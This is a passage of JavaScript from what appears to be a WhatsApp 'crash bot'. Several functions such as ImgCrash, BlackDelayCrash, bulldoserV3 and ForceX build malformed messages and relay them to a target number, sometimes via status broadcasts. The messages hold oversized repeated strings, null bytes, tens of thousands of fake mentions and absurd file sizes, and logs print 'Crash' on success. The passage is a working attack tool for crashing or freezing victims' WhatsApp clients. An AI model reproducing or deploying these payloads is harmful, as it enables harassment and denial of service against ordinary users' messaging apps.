jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
scanLengths: [ 5657, 38661, 12072, 27792 ],
},
hasMediaAttachment: true, 
},
body: { 
text: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️"
},
footer: {
text: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️.json"
},
nativeFlowMessage: {
messageParamsJson: "\n".repeat(10000) 
}
}
]
},
contextInfo: {
mentionedJid: mentionedList,
participant: "0@s.whatsapp.net",
isGroupMention: true,
quotedMessage: {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
format: "DEFAULT"
},
nativeFlowResponseMessage: {
name: "review_and_pay",
paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐆𝐨𝐝𝐬\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
version: 3
}
}
}
}
},
remoteJid: "@s.whatsapp.net"
}
}
}
}
}, {});

await Mvaa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

if (mention) {
        await Mvaa.relayMessage(
            target,
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️" },
                        content: undefined,
                    },
                ],
            }
        );
    }
}

async function ImgCrash(target) {
  for (let y = 0; y < 1; y++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "o2Eb2bT8YhZ8cqXOEYAognoQD/PsaEjg8FE9NbF9tDs=",
                fileLength: "182328",
                height: 1280,
                width: 1280,
                mediaKey: "npSqB+cuTkghZ2rifzzMQkhyUf5d8Iwa+5HlHGL3tcA=",
                caption: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
                fileEncSha256: "nQZ221+c8J3gzT77f7Li33klE8TagaSjA7AM55arqLA=",
                directPath: "/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1750938694",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
                forwardingScore: 250208,
                isForwarded: true,
                stanzaId: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️" + Date.now(),
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                extendedTextMessage: {
                text: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
                contextInfo: {
                mentionedJid: ["13135550002@s.whatsapp.net"],
                externalAdReply: {
                title: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
                body: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
                thumbnailUrl: "",
                mediaType: 1,
                sourceUrl: "https://Zeppeli.example.com",
                showAdAttribution: false // trigger 1
                   }
                  }
                 }
                }
              }
            }
          }
        }
      };
      
      const msg = await generateWAMessageFromContent(target, message, { quoted: null });
      
      await Mvaa.relayMessage(target, msg.message, {
       participant:
      { jid:target }, 
        messageId: msg.key.id
      });
      
      console.log(`✅ Crash ${target}`);
    } catch (err) {
      console.error("❌ Gagal crash:", err);
    }
  }
}

async function BlackDelayCrash(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await Mvaa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Mvaa.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function fetchDataWithDelay(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/11839107_2567829876893377_3621701686065316774_n.enc?ccb=11-4&oh=01_Q5Aa1gFIWwFJM8J2nLUGd469ioSr0ih53N-2faYsjJe4RjxoDA&oe=6859BF9B&_nc_sid=5e03e0",
                    mimetype: "application/octet-stream",
                    caption: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️" + "\u200B".repeat(200),
                    fileSha256: "qtu+yRXr/A6WokTrbOSqaSzxccaxfiyBPQ3kD04vBnA=",
                    fileLength: {
                        low: 1073741823,
                        high: 0,
                        unsigned: true
                    },
                    mediaKey: "eDuhZd9jLU+wY1wcZuaZGKUV/D0DjY+dycbgPSIGqUQ=",
                    fileEncSha256: "w5GmUzDGKYQi0jo1SPORqEE66V/NJDMvyAW1WFUNxqg=",
                    directPath: "/v/t62.7119-24/11839107_2567829876893377_3621701686065316774_n.enc?ccb=11-4&oh=01_Q5Aa1gFIWwFJM8J2nLUGd469ioSr0ih53N-2faYsjJe4RjxoDA&oe=6859BF9B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1,
                    jpegThumbnail: "",
                    hasMediaAttachment: true,
                    pageCount: 65535,
                    contextInfo: {
                        mentionedJid: [
                            "ai@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 70000) + "@s.whatsapp.net")
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    let msg = await generateWAMessageFromContent(target, {
        buttonsMessage: {
            text: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
            contentText: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
            footerText: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️",
            buttons: [
                {
                    buttonId: ".dryzxmods",
                    buttonText: {
                        displayText: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️" + "ꦾ".repeat(12000),
                    },
                    type: 1,
                },
            ],
            headerType: 1,
        },
    }, {});

    await Mvaa.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined,
                            },
                        ],
                    },
                ],
            },
        ],
    });

    if (mention) {
        await Mvaa.relayMessage(
            target,
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "☇ 𝐃͢𝐫𝐲𝐳𝐱͍ 𝐌͢𝐨𝐝͛𝐝͛𝐞͍𝐫ͯ𝐬̬ 〽️" },
                        content: undefined,
                    },
                ],
            }
        );
    }
}

async function ExTraKouta(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Mvaa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function bulldoserV3(target) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };
  
  const payload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };
  
  const ortulu = {
    buttonsResponseMessage: {
      selectedButtonId: "   ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️   ".repeat(10000),
      selectedDisplayText: "Tk - Modders",
      contextInfo: {
        mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
          quotedMessage: {
              message: {
                text: "   ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️   ",
                footer: "XxX",
                buttons: [{
                    buttonId: `🚀`, 
                    buttonText: {
                        displayText: '   ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️   '.repeat(5000)
                    },
                    type: 1 
                }],
                headerType: 1,
                viewOnce: false
              }
          },          
      },
      type: 1
    }
  };

  const msg1 = generateWAMessageFromContent(target, message, {});
  
  const msg2 = generateWAMessageFromContent(target, payload, {});
  
  const msg3 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      ortulu 
    }
  }, {});

    for (const msg of [msg1, msg2, msg3]) {
  await Mvaa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });
  }
}

async function ForceX(target) {
let Payload = generateWAMessageFromContent(target, proto.Message.fromObject({
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
title: "꙳͙͡༑ᐧزهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
locationMessage: {
degreesLatitude: -999.03499999999999,
degreesLongitude: 922.999999999999,
name: "☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
address: "زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
jpegThumbnail: null
},
hasMediaAttachment: false
},
body: {
text: "꙳͙͡༑ᐧ ̬..زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي  :: ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ :: >☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [],
},
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0PayloadFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
fileName: "ZynXzo New",
fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
mediaKeyTimestamp: "1726867151",
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z"
},
hasMediaAttachment: true
}
}
}
}), {
userJid: target,
quoted: null
});

await Mvaa.relayMessage('status@broadcast', Payload.message, {
messageId: Payload.key.id,
statusJidList: [target],
additionalNodes: [{
tag: 'meta',
attrs: {},
content: [{
tag: 'mentioned_users',
attrs: {},
content: [{
tag: 'to',
attrs: {
jid: target
},
content: undefined
}]
}]
}]
});
};
async function FcinvisAll(target) {
let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
title: "꙳͙͡༑ᐧزهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
locationMessage: {
degreesLatitude: -999.03499999999999,
degreesLongitude: 922.999999999999,
name: "☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
address: "زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️ زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️زهروز ريي   ☇𝐑̶𝐞𝐲̋͢.ۥ۬ۤ.𝐏̶𝐫͠𝐢̋𝐦͠𝐫𝐨𝐬͓𝐞〽️",
jpegThumbnail: null
},
hasMediaAttachment: false
},
body: {
